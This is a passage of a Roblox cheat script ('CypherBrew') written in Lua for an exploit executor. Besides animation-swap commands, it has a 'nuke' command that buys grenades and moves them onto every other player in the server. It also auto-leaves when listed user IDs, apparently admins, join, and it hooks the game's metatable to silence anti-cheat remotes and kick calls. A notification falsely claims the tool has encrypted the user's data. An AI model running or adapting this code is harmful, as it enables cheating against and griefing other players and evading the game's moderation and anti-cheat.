			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Robot Animation
	addCommand({
		["Name"] = "robot";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Stylish Animation
	addCommand({
		["Name"] = "stylish";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- SuperHero Animation
	addCommand({
		["Name"] = "superhero";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Toy Animation
	addCommand({
		["Name"] = "toy";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Vampire Animation
	addCommand({
		["Name"] = "vampire";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Werewolf Animation
	addCommand({
		["Name"] = "werewolf";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Zombie Animation
	addCommand({
		["Name"] = "zombie";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- // exploit info
	addCommand({
		["Name"] = "exploitinfo";
		["Function"] = function()
			sendNotif("[CypherBrew]", "Check Exploit Functions on console / printed functions", 15);
			local Globals = {
				getconnections,
				getgc,
				getinstances,
				getnilinstances,
				getscripts,
				getloadedmodules,
				fireclickdetector,
				firetouchinterest,
				isnetworkowner,
				gethiddenproperty,
				sethiddenproperty,
				setsimulationradius,
				getsenv,
				getcallingscript,
				getrawmetatable,
				setrawmetatable,
				setreadonly,
				isreadonly,
				hookfunction,
				newcclosure,
				checkcaller,
				decompile,
				setfflag,
				getnamecallmethod,
				setnamecallmethod,
				getspecialinfo,
				saveinstance,
				drawing,
				debug,
				debug.getconstants,
				debug.getconstant,
				debug.setconstant,
				debug.getupvalues,
				debug.getupvalue,
				debug.setupvalue,
				debug.getprotos,
				debug.getproto,
				debug.setproto,
				debug.getstack,
				debug.setstack,
				debug.setmetatable,
				debug.getregistry,
				debug.getinfo
			}

			local GlobalsNames = {
				"getconnections",
				"getgc",
				"getinstances",
				"getnilinstances",
				"getscripts",
				"getloadedmodules",
				"fireclickdetector",
				"firetouchinterest",
				"isnetworkowner",
				"gethiddenproperty",
				"sethiddenproperty",
				"setsimulationradius",
				"getsenv",
				"getcallingscript",
				"getrawmetatable",
				"setrawmetatable",
				"setreadonly",
				"isreadonly",
				"hookfunction",
				"newcclosure",
				"checkcaller",
				"decompile",
				"setfflag",
				"getnamecallmethod",
				"setnamecallmethod",
				"getspecialinfo",
				"saveinstance",
				"drawingtable",
				"debugtable",
				"debug.getconstants",
				"debug.getconstant",
				"debug.setconstant",
				"debug.getupvalues",
				"debug.getupvalue",
				"debug.setupvalue",
				"debug.getprotos",
				"debug.getproto",
				"debug.setproto",
				"debug.getstack",
				"debug.setstack",
				"debug.setmetatable",
				"debug.getregistry",
				"debug.getinfo"
			}

			for i, v in pairs(GlobalsNames) do
				if Globals[i] then
					print(v.." | Supported")
				else
					print(v.." | Not Supported")
				end
			end
			-- Checks what functions your executor has pretty much u can check what it has
		end;
	})

	addCommand({
		["Name"] = "nuke";
		["Function"] = function()
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Grenade]' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(108.995865, -26.7500305, -276.529877)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Grenade]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Grenade] - $700"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				local oh1 = CFrame.new(-411.605194, 21.7499943, -332.942078)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
				local oh1 = CFrame.new(-396.677094, 51.750145, -336.327148)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
				local oh1 = CFrame.new(-408.277466, 77.8071213, -369.336456)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
				local oh1 = CFrame.new(-396.90979, 61.7791367, -381.694397)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
			end
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local char = LocalPlayer.Character
			local Ignored = game.workspace.Ignored
			local backpack = LocalPlayer.Backpack
			local x = 0
			local Grenade = "[Grenade]"
			local DroppedGrenade = "Handle"
			for i, v in pairs(backpack:GetChildren()) do
				if v.Name == Grenade then
					v.Parent = char
				end
			end
			for i, v in pairs(char:GetChildren()) do
				if v.Name == Grenade then
					v:Activate()
					v:Activate()
				end
			end
			wait (1)
			for i, v in pairs(Ignored:GetChildren()) do
				if v.Name == DroppedGrenade then
					x = x + 1
					v.Name = DroppedGrenade..x
				end
			end
			wait(1)
			x = 0
			for i, player in pairs(game.Players:GetPlayers()) do
				x = x + 1
				local launch = Ignored:WaitForChild(DroppedGrenade..x)
				if LocalPlayer.Name == player.Name then
					do
						launch.Position = Vector3.new(0, 1000, 0)
					end
				else
					do
						game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge) * math.huge
						game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge, math.huge) * math.huge
						launch.Position = player.Character.HumanoidRootPart.Position
						wait (0.02)
					end

				end
			end
		end;
	});





  --// ends it here 

	-- // Finish up
do 
wait(0.1)
--\\ Info Credits.
	sendNotif("CypherBrew Has Encrypted Your Data.");
	sendNotif("Version: " .. cosbySettings.Version);
    sendNotif("CypherBrew Security", "Credits to Owner: SploitGodZ, Keybind is: " .. cosbySettings.Hotkey);
    sendNotif("CypherBrew", "Press V To Open and Close The Command Prompt.");
end;

local bitch = {
	163721789,
	15427717,
	201454243,
	822999,
	63794379,
	17260230,
	28357488,
	93101606,
	8195210,
	89473551,
	16917269,
	85989579,
	1553950697,
	476537893,
	155627580,
	31163456,
	7200829,
	25717070,
	201454243,
	15427717,
	63794379,
	16138978,
	60660789,
	17260230,
	16138978,
	1161411094,
	9125623,
	11319153,
	34758833,
	194109750,
	35616559,
	1257271138,
	28885841,
	23558830,
	25717070,
}

for l, c in pairs(game.Players:GetChildren()) do
	for i, v in pairs(bitch) do
		if c.UserId == v then
			game.Players.LocalPlayer:Kick("Admin joined! Phew, that was a close one! Saved by CypherBrew!")
		end
	end
end
game.Players.PlayerAdded:Connect(function(plr)
	for i, v in pairs(bitch) do
		if plr.UserId == v then
			game.Players.LocalPlayer:Kick("Admin joined! Phew, that was a close one! Saved by CypherBrew!")
		end
	end
end)

local a = getrawmetatable(game)
local sucks = a.__namecall
local player = game.Players.LocalPlayer
setreadonly(a, false)
a.__namecall = newcclosure(function(name, ...)
	local tabs = {
		...
	}
	if getnamecallmethod() == "FireServer" and tostring(name) == "MainEvent" then
		if tabs[1] == "CHECKER_1" or tabs[1] == "TeleportDetect" or tabs[1] == "OneMoreTime" then
			return wait(9e9)
		end
	end
	if getnamecallmethod() == "Kick" then
		return wait(9e9)
	end
	return sucks(name, unpack(tabs))
end)
setreadonly(a, true)
